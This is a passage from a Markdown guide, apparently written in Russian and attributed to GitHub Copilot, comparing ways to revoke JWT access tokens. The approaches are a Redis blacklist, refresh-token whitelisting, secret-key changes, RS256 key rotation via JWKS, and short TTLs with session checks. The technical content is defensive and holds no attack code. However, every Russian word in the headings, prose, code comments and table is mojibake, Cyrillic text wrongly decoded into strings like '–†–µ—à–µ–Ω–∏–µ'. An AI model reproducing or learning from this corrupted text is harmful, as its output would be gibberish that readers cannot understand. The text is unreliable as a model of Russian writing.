### –†–µ—à–µ–Ω–∏–µ 1: Blacklist (–ß–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫)

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- –•—Ä–∞–Ω–∏–º –≤ **Redis** —Å–ø–∏—Å–æ–∫ –æ—Ç–æ–∑–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –ø–æ `jti` (—É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID —Ç–æ–∫–µ–Ω–∞)
- –ü—Ä–∏ –∫–∞–∂–¥–æ–π –ø—Ä–æ–≤–µ—Ä–∫–µ —Ç–æ–∫–µ–Ω–∞: **–∑–∞–ø—Ä–æ—Å –≤ Redis** ‚Üí –µ—Å—Ç—å –ª–∏ —Ç–∞–º —ç—Ç–æ—Ç `jti`?
- –ï—Å–ª–∏ –µ—Å—Ç—å ‚Üí —Ç–æ–∫–µ–Ω –æ—Ç–æ–∑–≤–∞–Ω, –æ—Ç–∫–ª–æ–Ω—è–µ–º

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**

```python
# –ü—Ä–∏ logout
redis.set(f"blacklist:{token_jti}", "1", ex=token_ttl)  # TTL = –≤—Ä–µ–º—è –¥–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞

# –ü—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Ç–æ–∫–µ–Ω–∞
if redis.exists(f"blacklist:{token_jti}"):
    raise HTTPException(401, "–¢–æ–∫–µ–Ω –æ—Ç–æ–∑–≤–∞–Ω")
```

**–ü–ª—é—Å—ã:**

- ‚úÖ –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤
- ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç —Å –ª—é–±—ã–º–∏ —Ç–æ–∫–µ–Ω–∞–º–∏

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **–£–±–∏–≤–∞–µ–º stateless** ‚Äî —Ç–µ–ø–µ—Ä—å Redis –Ω—É–∂–µ–Ω –ø—Ä–∏ –∫–∞–∂–¥–æ–π –ø—Ä–æ–≤–µ—Ä–∫–µ
- ‚ùå –ù—É–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å blacklist –¥–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è –í–°–ï–• —Ç–æ–∫–µ–Ω–æ–≤ (–µ—Å–ª–∏ —Ç–æ–∫–µ–Ω –∂–∏–≤–µ—Ç 1 —á–∞—Å, —Ö—Ä–∞–Ω–∏–º –∑–∞–ø–∏—Å–∏ 1 —á–∞—Å)
- ‚ùå –ï—Å–ª–∏ Redis —É–ø–∞–ª ‚Üí –≤—Å–µ —Ç–æ–∫–µ–Ω—ã "—Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã"

---

### –†–µ—à–µ–Ω–∏–µ 2: Whitelist + Refresh Tokens (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ–º–æ–µ)

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- **Access Token** ‚Äî stateless, –∫–æ—Ä–æ—Ç–∫–∏–π (15 –º–∏–Ω—É—Ç), –ù–ï —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –ë–î
- **Refresh Token** ‚Äî —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –ë–î (whitelist)
- –ü—Ä–∏ logout **—É–¥–∞–ª—è–µ–º Refresh Token –∏–∑ –ë–î**

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**

```python
# –¢–∞–±–ª–∏—Ü–∞ –≤ –ë–î
CREATE TABLE refresh_tokens (
    id UUID PRIMARY KEY,
    user_id INT,
    token_hash VARCHAR(64),  # –•–µ—à–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω!
    expires_at TIMESTAMP,
    created_at TIMESTAMP
);

# –ü—Ä–∏ –≤—ã–¥–∞—á–µ Refresh Token
db.insert(refresh_tokens, {
    'user_id': user.id,
    'token_hash': hash(refresh_token),
    'expires_at': now() + 7 days
})

# –ü—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ Access Token
token = db.query("SELECT * FROM refresh_tokens WHERE token_hash = ?", hash(refresh_token))
if not token:
    raise HTTPException(401, "Refresh token –æ—Ç–æ–∑–≤–∞–Ω –∏–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")

# –í—ã–¥–∞–µ–º –Ω–æ–≤—ã–π Access Token

# –ü—Ä–∏ logout
db.delete("DELETE FROM refresh_tokens WHERE user_id = ?", user.id)
# –í—Å–µ Refresh —Ç–æ–∫–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É–¥–∞–ª–µ–Ω—ã!
```

**–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç:**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª "–í—ã–π—Ç–∏ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤"
2. –£–¥–∞–ª–∏–ª–∏ –≤—Å–µ –µ–≥–æ Refresh —Ç–æ–∫–µ–Ω—ã –∏–∑ –ë–î
3. Access —Ç–æ–∫–µ–Ω—ã **–µ—â–µ —Ä–∞–±–æ—Ç–∞—é—Ç** 15 –º–∏–Ω—É—Ç (stateless!)
4. –ß–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç Access –∏—Å—Ç–µ–∫ ‚Üí –Ω—É–∂–µ–Ω Refresh
5. Refresh –Ω–µ—Ç –≤ –ë–î ‚Üí –æ—Ç–∫–ª–æ–Ω–µ–Ω–æ
6. **–§–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –æ—Ç–∑—ã–≤: –º–∞–∫—Å–∏–º—É–º 15 –º–∏–Ω—É—Ç –∑–∞–¥–µ—Ä–∂–∫–∏**

**–ü–ª—é—Å—ã:**

- ‚úÖ Access Token –æ—Å—Ç–∞–µ—Ç—Å—è stateless (99% –∑–∞–ø—Ä–æ—Å–æ–≤)
- ‚úÖ –¢–æ–ª—å–∫–æ Refresh –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –≤ –ë–î (1% –∑–∞–ø—Ä–æ—Å–æ–≤)
- ‚úÖ –ú–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å –≤—Å–µ —Ç–æ–∫–µ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ–¥–Ω–∏–º –∑–∞–ø—Ä–æ—Å–æ–º

**–ú–∏–Ω—É—Å—ã:**

- ‚ö†Ô∏è –ù–µ –º–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤ (–∑–∞–¥–µ—Ä–∂–∫–∞ = TTL Access Token)
- ‚ö†Ô∏è Refresh Token ‚Äî —ç—Ç–æ —É–∂–µ state

---

### –†–µ—à–µ–Ω–∏–µ 3: –°–º–µ–Ω–∞ —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ (–Ø–î–ï–†–ù–ê–Ø –û–ü–¶–ò–Ø)

**–î–ª—è —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (HS256):**

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- –£ –≤–∞—Å –æ–¥–∏–Ω `SECRET_KEY` –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ –≤—Å–µ—Ö —Ç–æ–∫–µ–Ω–æ–≤
- –ú–µ–Ω—è–µ—Ç–µ –∫–ª—é—á ‚Üí **–í–°–ï —Ç–æ–∫–µ–Ω—ã —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–º–∏**

**–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**

- –ì–ª–æ–±–∞–ª—å–Ω—ã–π –≤–∑–ª–æ–º (—É–∫—Ä–∞–ª–∏ SECRET_KEY)
- –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π –±–∞–≥ –≤ —Å–∏—Å—Ç–µ–º–µ
- "–í—ã–∫–∏–Ω—É—Ç—å –í–°–ï–• –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"

**–ö–∞–∫:**

```python
# –ë—ã–ª–æ
SECRET_KEY = "old-secret-key-123"

# –°—Ç–∞–ª–æ
SECRET_KEY = "new-secret-key-456"

# –†–µ–∑—É–ª—å—Ç–∞—Ç: –≤—Å–µ —Ç–æ–∫–µ–Ω—ã —Å –ø–æ–¥–ø–∏—Å—å—é —Å—Ç–∞—Ä—ã–º –∫–ª—é—á–æ–º ‚Üí –Ω–µ–≤–∞–ª–∏–¥–Ω—ã
```

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **–†–ê–ó–õ–û–ì–ò–ù–ò–í–ê–ï–¢ –í–°–ï–•** –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- ‚ùå –ù—É–∂–Ω–æ –ø–µ—Ä–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤—ã–≤–∞—Ç—å—Å—è

---

### –†–µ—à–µ–Ω–∏–µ 4: –†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π –¥–ª—è –∞—Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (RS256)

**–î–ª—è –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–æ–≤ —Å –ø—É–±–ª–∏—á–Ω—ã–º/–ø—Ä–∏–≤–∞—Ç–Ω—ã–º –∫–ª—é—á–æ–º:**

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- Auth Server –∏–º–µ–µ—Ç **–ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á** (–ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç —Ç–æ–∫–µ–Ω—ã)
- –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã –∏–º–µ—é—Ç **–ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á** (–ø—Ä–æ–≤–µ—Ä—è—é—Ç –ø–æ–¥–ø–∏—Å—å)
- –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏: Auth Server **–º–µ–Ω—è–µ—Ç –ø–∞—Ä—É –∫–ª—é—á–µ–π**

**–°—Ö–µ–º–∞:**

```
–î–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏:
Auth Server (Private Key v1) ‚Üí —Å–æ–∑–¥–∞–µ—Ç —Ç–æ–∫–µ–Ω—ã
   ‚Üì
Services (Public Key v1) ‚Üí –ø—Ä–æ–≤–µ—Ä—è—é—Ç —Ç–æ–∫–µ–Ω—ã ‚úì

–ü–æ—Å–ª–µ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏:
Auth Server (Private Key v2) ‚Üí —Å–æ–∑–¥–∞–µ—Ç –ù–û–í–´–ï —Ç–æ–∫–µ–Ω—ã
   ‚Üì
Services –æ–±–Ω–æ–≤–ª—è—é—Ç Public Key v2
   ‚Üì
–°—Ç–∞—Ä—ã–µ —Ç–æ–∫–µ–Ω—ã (–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ v1) ‚Üí –ù–ï–í–ê–õ–ò–î–ù–´
–ù–æ–≤—ã–µ —Ç–æ–∫–µ–Ω—ã (–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ v2) ‚Üí –í–ê–õ–ò–î–ù–´ ‚úì
```

**–ö–∞–∫ —ç—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ:**

1. **Auth Server –ø—É–±–ª–∏–∫—É–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–µ –∫–ª—é—á–∏ —á–µ—Ä–µ–∑ JWKS (JSON Web Key Set):**

```
GET https://auth.example.com/.well-known/jwks.json

{
  "keys": [
    {
      "kid": "key-v1",        // Key ID
      "kty": "RSA",
      "use": "sig",
      "n": "...",             // –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á (—á–∞—Å—Ç—å 1)
      "e": "AQAB"             // –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á (—á–∞—Å—Ç—å 2)
    },
    {
      "kid": "key-v2",        // –ù–æ–≤—ã–π –∫–ª—é—á (–ø–æ—Å–ª–µ —Ä–æ—Ç–∞—Ü–∏–∏)
      "kty": "RSA",
      "use": "sig",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

2. **–¢–æ–∫–µ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç `kid` –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-v2"    // –ö–∞–∫–æ–π –∫–ª—é—á –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –¥–ª—è –ø–æ–¥–ø–∏—Å–∏
}
```

3. **–ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å –ø—Ä–æ–≤–µ—Ä—è–µ—Ç:**
   - –ß–∏—Ç–∞–µ—Ç `kid` –∏–∑ —Ç–æ–∫–µ–Ω–∞
   - –°–∫–∞—á–∏–≤–∞–µ—Ç —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á —Å Auth Server
   - –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å

4. **–ü—Ä–∏ —Ä–æ—Ç–∞—Ü–∏–∏:**
   - Auth Server —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π `key-v3`
   - –ü—É–±–ª–∏–∫—É–µ—Ç –µ–≥–æ –≤ JWKS
   - –ù–æ–≤—ã–µ —Ç–æ–∫–µ–Ω—ã –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç `key-v3`
   - –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–∫–∞—á–∏–≤–∞—é—Ç –Ω–æ–≤—ã–π –∫–ª—é—á
   - –°—Ç–∞—Ä—ã–µ —Ç–æ–∫–µ–Ω—ã (—Å `key-v1`) **–ø–µ—Ä–µ—Å—Ç–∞—é—Ç —Ä–∞–±–æ—Ç–∞—Ç—å** (–º–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å –∫–ª—é—á –∏–∑ JWKS)

**–ü–ª—é—Å—ã:**

- ‚úÖ –ú–æ–∂–Ω–æ –æ—Ç–æ–∑–≤–∞—Ç—å **–≤—Å–µ —Ç–æ–∫–µ–Ω—ã –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º –∫–ª—é—á–æ–º**
- ‚úÖ –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã –æ–±–Ω–æ–≤–ª—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ (—á–∏—Ç–∞—é—Ç JWKS)
- ‚úÖ –ì—Ä–∞–Ω—É–ª—è—Ä–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å (–º–æ–∂–Ω–æ –¥–µ—Ä–∂–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–ª—é—á–µ–π)

**–ú–∏–Ω—É—Å—ã:**

- ‚ö†Ô∏è –°–ª–æ–∂–Ω–æ—Å—Ç—å –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã
- ‚ö†Ô∏è –ù—É–∂–Ω–∞ —Å–∏—Å—Ç–µ–º–∞ –∫–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è JWKS (—á—Ç–æ–±—ã –Ω–µ —Å–∫–∞—á–∏–≤–∞—Ç—å –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ)

**–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**

- –ë–æ–ª—å—à–∞—è –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ (10+ —Å–µ—Ä–≤–∏—Å–æ–≤)
- –í—ã—Å–æ–∫–∏–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è –∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- OAuth2 –ø—Ä–æ–≤–∞–π–¥–µ—Ä—ã (Google, GitHub —Ç–∞–∫ –¥–µ–ª–∞—é—Ç)

---

### –†–µ—à–µ–Ω–∏–µ 5: –ö–æ—Ä–æ—Ç–∫–æ–µ TTL + –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –≤ –ë–î

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- Access Token –∂–∏–≤–µ—Ç **–æ—á–µ–Ω—å –º–∞–ª–æ** (1-5 –º–∏–Ω—É—Ç)
- –í payload —Ç–æ–∫–µ–Ω–∞ –¥–æ–±–∞–≤–ª—è–µ–º `session_id`
- –ü—Ä–∏ **–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏—è—Ö** –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ—Å—Å–∏—é –≤ –ë–î

**–ü—Ä–∏–º–µ—Ä:**

```python
# –û–±—ã—á–Ω—ã–π –∑–∞–ø—Ä–æ—Å (—á—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö)
@app.get("/articles")
async def get_articles(token: dict = Depends(verify_token)):
    # –ü—Ä–æ—Å—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å—å JWT ‚Äî –ë–î –Ω–µ —Ç—Ä–æ–≥–∞–µ–º
    return articles

# –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ–ø–µ—Ä–∞—Ü–∏—è (–ø–µ—Ä–µ–≤–æ–¥ –¥–µ–Ω–µ–≥)
@app.post("/transfer")
async def transfer_money(token: dict = Depends(verify_token)):
    # 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å—å JWT
    # 2. –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–û: –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ—Å—Å–∏—é –≤ –ë–î
    session = db.query("SELECT * FROM sessions WHERE id = ?", token['session_id'])
    if not session or session.revoked:
        raise HTTPException(401, "–°–µ—Å—Å–∏—è –æ—Ç–æ–∑–≤–∞–Ω–∞")
    
    # –ü–µ—Ä–µ–≤–æ–¥–∏–º –¥–µ–Ω—å–≥–∏
```

**–ü–ª—é—Å—ã:**

- ‚úÖ Stateless –¥–ª—è 99% –∑–∞–ø—Ä–æ—Å–æ–≤ (—á—Ç–µ–Ω–∏–µ)
- ‚úÖ Stateful –¥–ª—è 1% –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π (–¥–µ–Ω—å–≥–∏, —É–¥–∞–ª–µ–Ω–∏–µ)

---

### –°—Ä–∞–≤–Ω–µ–Ω–∏–µ –ø–æ–¥—Ö–æ–¥–æ–≤

| –ü–æ–¥—Ö–æ–¥ | –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤? | Stateless? | –°–ª–æ–∂–Ω–æ—Å—Ç—å | –ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å |
|--------|-------------------|------------|-----------|-------------------|
| **Blacklist** | ‚úÖ –î–∞ | ‚ùå –ù–µ—Ç (Redis –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ) | –°—Ä–µ–¥–Ω—è—è | –ù–µ–±–æ–ª—å—à–∏–µ –ø—Ä–æ–µ–∫—Ç—ã, –Ω—É–∂–µ–Ω –ø–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å |
| **Whitelist (Refresh)** | ‚ö†Ô∏è –ó–∞–¥–µ—Ä–∂–∫–∞ (TTL Access) | ‚úÖ –î–∞ (–¥–ª—è Access) | –°—Ä–µ–¥–Ω—è—è | **–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –¥–ª—è –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞** |
| **–°–º–µ–Ω–∞ –∫–ª—é—á–∞** | ‚úÖ –î–∞ (–Ω–æ –≤—Å–µ —Ç–æ–∫–µ–Ω—ã) | ‚úÖ –î–∞ | –ù–∏–∑–∫–∞—è | –ì–ª–æ–±–∞–ª—å–Ω—ã–π –∏–Ω—Ü–∏–¥–µ–Ω—Ç |
| **–†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π (RS256)** | ‚úÖ –î–∞ (–ø–æ –∫–ª—é—á—É) | ‚úÖ –î–∞ | –í—ã—Å–æ–∫–∞—è | –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã, OAuth2 |
| **–ö–æ—Ä–æ—Ç–∫–æ–µ TTL + –ø—Ä–æ–≤–µ—Ä–∫–∞ –ë–î** | ‚úÖ –î–∞ (–¥–ª—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö) | ‚ö†Ô∏è –ß–∞—Å—Ç–∏—á–Ω–æ | –°—Ä–µ–¥–Ω—è—è | –§–∏–Ω–∞–Ω—Å—ã, –≤—ã—Å–æ–∫–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å |

---

### –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è –¥–ª—è –≤–∞—à–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞

**–¢–µ–∫—É—â–∏–π —ç—Ç–∞–ø (—É—á–µ–±–Ω—ã–π):**

- –û–¥–∏–Ω Access Token (1 —á–∞—Å)
- –ë–µ–∑ –æ—Ç–∑—ã–≤–∞
- **–ü—Ä–æ—Å—Ç–æ –∏ –ø–æ–Ω—è—Ç–Ω–æ**

**–°–ª–µ–¥—É—é—â–∏–π —à–∞–≥ (production):**

- Access Token (15 –º–∏–Ω) + Refresh Token (7 –¥–Ω–µ–π)
- Refresh —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –ë–î (whitelist)
- –ü—Ä–∏ logout —É–¥–∞–ª—è–µ–º Refresh
- **–ë–∞–ª–∞–Ω—Å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏**

**–ï—Å–ª–∏ –Ω—É–∂–µ–Ω –ü–û–õ–ù–´–ô –∫–æ–Ω—Ç—Ä–æ–ª—å:**

- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ **—Å–µ—Å—Å–∏–∏ –≤–º–µ—Å—Ç–æ JWT**
- –•—Ä–∞–Ω–∏—Ç–µ –≤—Å—ë –≤ Redis
- –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤ –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**

- Access Token —É–∫—Ä–∞–ª–∏? –ß–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç –±–µ—Å–ø–æ–ª–µ–∑–µ–Ω
- Refresh Token –æ—Ç–æ–∑–≤–∞–ª–∏? –ù–æ–≤—ã–π Access –Ω–µ –ø–æ–ª—É—á–∏—Ç—å

---

## –ò—Ç–æ–≥–æ: –≠–≤–æ–ª—é—Ü–∏—è –ø–æ–¥—Ö–æ–¥–∞

### –£—Ä–æ–≤–µ–Ω—å 1: –í–∞—à —Ç–µ–∫—É—â–∏–π (—É—á–µ–±–Ω—ã–π)

- –û–¥–∏–Ω Access Token
- –°—Ä–æ–∫ –∂–∏–∑–Ω–∏: 1 —á–∞—Å
- –•—Ä–∞–Ω–µ–Ω–∏–µ: localStorage

**–ì–æ–¥–∏—Ç—Å—è –¥–ª—è:** –£—á–µ–±–Ω—ã—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤, MVP

---

### –£—Ä–æ–≤–µ–Ω—å 2: Production-ready

- Access Token (15 –º–∏–Ω) + Refresh Token (7 –¥–Ω–µ–π)
- Access –≤ –ø–∞–º—è—Ç–∏, Refresh –≤ HttpOnly Cookie
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ

**–ì–æ–¥–∏—Ç—Å—è –¥–ª—è:** –ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ SaaS –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π

---

### –£—Ä–æ–≤–µ–Ω—å 3: Enterprise

- Asymmetric keys (RS256)
- Microservices —Å –ø—É–±–ª–∏—á–Ω—ã–º–∏ –∫–ª—é—á–∞–º–∏
- Token introspection (–ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ API)
- Rotation –∫–ª—é—á–µ–π
- Blacklist –≤ Redis

**–ì–æ–¥–∏—Ç—Å—è –¥–ª—è:** –ë–∞–Ω–∫–∏, —Ñ–∏–Ω—Ç–µ—Ö, –±–æ–ª—å—à–∏–µ –∫–æ—Ä–ø–æ—Ä–∞—Ü–∏–∏

---

## –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã

**–ü–æ—á–∏—Ç–∞—Ç—å:**

- [jwt.io](https://jwt.io) ‚Äî –¥–µ–∫–æ–¥–µ—Ä —Ç–æ–∫–µ–Ω–æ–≤ –∏ –≤–≤–µ–¥–µ–Ω–∏–µ
- [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) ‚Äî –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—è JWT
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

**–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã:**

- [jwt.io Debugger](https://jwt.io) ‚Äî –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤
- [JWK Generator](https://mkjwk.org/) ‚Äî –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–µ–π –¥–ª—è RS256

---

**–ê–≤—Ç–æ—Ä:** GitHub Copilot  
**–î–∞—Ç–∞:** 19 –Ω–æ—è–±—Ä—è 2025 –≥.
